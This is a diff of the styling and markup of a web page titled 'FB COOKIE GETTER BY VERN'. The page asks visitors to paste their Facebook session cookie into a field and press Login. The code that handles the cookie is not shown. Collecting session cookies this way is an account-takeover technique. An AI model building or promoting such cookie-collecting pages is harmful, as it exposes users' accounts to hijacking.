@@ -8,7 +8,6 @@
       box-sizing: border-box;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
-
     html, body {
       margin: 0;
       padding: 0;
@@ -17,7 +16,6 @@
       background: #000;
       color: white;
     }
-
     body {
       display: flex;
       justify-content: center;
@@ -26,7 +24,6 @@
       position: relative;
       animation: fadeIn 2s ease-in-out;
     }
-
     .fog {
       position: absolute;
       top: 0;
@@ -38,12 +35,10 @@
       z-index: 0;
       animation: fogMove 200s linear infinite;
     }
-
     @keyframes fogMove {
       from { background-position: 0 0; }
       to { background-position: 10000px 0; }
     }
-
     .lightning {
       position: fixed;
       top: 0;
@@ -56,14 +51,12 @@
       z-index: 2;
       animation: lightningFlash 6s infinite;
     }
-
     @keyframes lightningFlash {
       0%, 96%, 100% { opacity: 0; }
       97% { opacity: 0.1; }
       98% { opacity: 0.5; }
       99% { opacity: 0.2; }
     }
-
     .container {
       position: relative;
       z-index: 3;
@@ -76,7 +69,6 @@
       text-align: center;
       animation: slideUp 1.5s ease-out;
     }
-
     h2 {
       color: #0ff;
       margin-bottom: 25px;
@@ -84,7 +76,6 @@
       letter-spacing: 1px;
       text-shadow: 0 0 10px #0ff;
     }
-
     input, select, button {
       width: 100%;
       padding: 14px 16px;
@@ -95,17 +86,14 @@
       outline: none;
       transition: transform 0.3s ease, box-shadow 0.3s ease;
     }
-
     input:focus, select:focus {
       transform: scale(1.02);
       box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
     }
-
     input, select {
       background-color: #222;
       color: white;
     }
-
     button {
       background-color: #0ff;
       color: #000;
@@ -113,12 +101,10 @@
       cursor: pointer;
       transition: background-color 0.3s ease, transform 0.2s;
     }
-
     button:hover {
       background-color: #08e;
       transform: scale(1.03);
     }
-
     ul {
       text-align: left;
       margin-top: 20px;
@@ -126,20 +112,16 @@
       color: #bbb;
       font-size: 14px;
     }
-
     li {
       margin-bottom: 8px;
     }
-
     iframe {
       display: none;
     }
-
     @keyframes fadeIn {
       from { opacity: 0; }
       to { opacity: 1; }
     }
-
     @keyframes slideUp {
       from { opacity: 0; transform: translateY(30px); }
       to { opacity: 1; transform: translateY(0); }
@@ -148,11 +130,9 @@
 </head>
 <body>
 
-<!-- Fog & Lightning -->
 <div class="fog"></div>
 <div class="lightning"></div>
 
-<!-- YouTube Music -->
 <iframe
   width="0"
   height="0"
@@ -161,12 +141,10 @@
   allow="autoplay"
 ></iframe>
 
-<!-- Thunder Sound -->
 <audio id="thunder" src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_0a5d2b4c67.mp3?filename=thunder-strike-8074.mp3"></audio>
 
-<!-- Main UI -->
 <div class="container">
-  <h2>FB COOKIE GETTER BY VERN!</h2>
+  <h2>FB COOKIE GETTER BY VERN 🍪</h2>
 
   <input type="text" id="cookie" placeholder="Paste your FB cookie" required>
   <button onclick="submitCookie()">Login</button>
@@ -205,7 +183,6 @@
     });
   }
 
-  // Thunder sound sync
   const thunderAudio = document.getElementById('thunder');
   setInterval(() => {
     if (Math.random() > 0.85) {
